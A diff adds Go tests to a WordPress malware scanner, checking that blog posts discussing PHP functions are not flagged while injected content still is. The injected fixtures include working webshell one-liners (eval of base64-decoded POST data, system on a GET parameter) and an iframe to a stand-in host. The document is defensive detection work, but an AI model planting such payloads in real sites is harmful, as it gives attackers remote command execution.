@@ -1,6 +1,7 @@
 package antivirus
 
 import (
+	"slices"
 	"strings"
 	"testing"
 )
@@ -66,6 +67,108 @@ func TestInjectedDatabaseValuesAreReported(t *testing.T) {
 		}
 		if finding.Engine != EngineDatabase {
 			t.Errorf("%s carries engine %q", name, finding.Engine)
+		}
+	}
+}
+
+// Post bodies a working WordPress site really holds. Every one of them passes
+// postPrefilter, so every one is READ by scanPosts and reaches the rules.
+//
+// This is a THIRD corpus, beside the option values above and the PHP source the
+// file rules were measured on. Post content is HTML somebody wrote, so a PHP
+// function name in it is the subject being written about rather than a call.
+var cleanPostBodies = map[string]string{
+	"a php tutorial": `<h2>Why you should never use eval()</h2>
+<p>The <code>eval()</code> construct executes a string as PHP. Calling eval() on
+anything a visitor sent you is the classic remote code execution bug.</p>`,
+
+	"a security post": `<p>Most WordPress backdoors follow the same shape: the payload is
+stored with base64_decode() and handed to eval() at runtime. Look for
+gzinflate() too, and for shell_exec() calls in your theme functions.</p>`,
+
+	"an upload how-to": `<p>Call move_uploaded_file() after validating the MIME type, then use
+file_put_contents() to write the thumbnail.</p>`,
+
+	"an analytics snippet": `<script async src="https://www.googletagmanager.com/gtag/js?id=G-ABC"></script>
+<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}
+gtag('js', new Date());gtag('config','G-ABC');</script>`,
+
+	"a post about the /e modifier": `<p>PHP 7 removed the /e modifier, so preg_replace('/(\w+)/e', 'strtoupper("$1")', $s)
+no longer works. Rewrite it with preg_replace_callback().</p>`,
+
+	"a code sample": `<pre><?php
+function hello() { echo "hi"; }
+?></pre>`,
+
+	"a shell tutorial": `<p>Both shell_exec() and passthru() run a command. Prefer proc_open()
+when you need the streams, and remember base64_decode() is not encryption.</p>`,
+}
+
+// Real injections into post content. Each must survive the narrower rule set, or
+// the fix below has traded a false positive for a missed backdoor.
+var injectedPostBodies = map[string]string{
+	"a script that decodes itself":   `<p>Nice article.</p><script>eval(atob('YWxlcnQoMSk='))</script>`,
+	"an unescaping script":           `<script>document.write(unescape('%3Ciframe src=//evil.tld%3E'))</script>`,
+	"a php webshell in the body":     `<?php eval(base64_decode($_POST['c'])); ?>`,
+	"assert on request data":         `<?php assert($_REQUEST['x']); ?>`,
+	"a file manager shell in a post": `<?php $shell='FilesMan'; system($_GET['cmd']); ?>`,
+}
+
+// A blog writing ABOUT PHP is not a compromised site.
+//
+// Measured with the option rule set applied to posts: four of these seven were
+// reported and two were critical, because DB.Exec.Eval carries weightStrong and
+// scoreSuspicious is below it, so one prose "eval()" convicted on its own.
+func TestAPostThatWritesAboutPHPIsNotAFinding(t *testing.T) {
+	for name, body := range cleanPostBodies {
+		if _, ok := weighRow("wp_posts", "post", 1, "", body); ok {
+			score, signature, _, level := verdict(evaluateDatabasePost(body), 0)
+			t.Errorf("%s was reported as %s (%d, %s)", name, level, score, signature)
+		}
+	}
+}
+
+// The other direction. Without this the narrowing could be taken as far as
+// reporting nothing at all and every check above would still pass.
+func TestARealInjectionIntoAPostIsStillCritical(t *testing.T) {
+	for name, body := range injectedPostBodies {
+		finding, ok := weighRow("wp_posts", "post", 1, "", body)
+		if !ok {
+			t.Errorf("%s produced no finding", name)
+			continue
+		}
+		if finding.Level != LevelCritical {
+			t.Errorf("%s came back %s, want %s (score %d, %s)",
+				name, finding.Level, LevelCritical, finding.Score, finding.Rules)
+		}
+	}
+}
+
+// The narrowing applies to POSTS and reaches no further. An option value is
+// loaded by WordPress on every request, which is why the wider set is right
+// there, and a rule quietly dropped from both would be the same defect in
+// reverse.
+func TestTheOptionRuleSetIsUnchanged(t *testing.T) {
+	// DB.Exec.Eval is the rule that convicts prose. It must still fire on an
+	// option, where nobody writes prose.
+	if _, ok := weighRow("wp_options", "option", 1, "widget_text", `eval($stored_code);`); !ok {
+		t.Error("a bare eval in an option value is no longer reported")
+	}
+	if _, ok := weighRow("wp_posts", "post", 1, "", `eval($stored_code);`); ok {
+		t.Error("a bare eval in a post body is still reported")
+	}
+	// Every rule still belongs to the option set; only the post set is narrower.
+	for _, r := range dbHeuristics {
+		if !appliesTo(r, extDatabase) {
+			t.Errorf("%s no longer applies to an option value", r.name)
+		}
+	}
+	if len(postApplicable) == 0 {
+		t.Fatal("no rule judges a post, so the post scan reports nothing at all")
+	}
+	for name := range postApplicable {
+		if !slices.ContainsFunc(dbHeuristics, func(r rule) bool { return r.name == name }) {
+			t.Errorf("postApplicable names %s, which is not a rule in the set", name)
 		}
 	}
 }
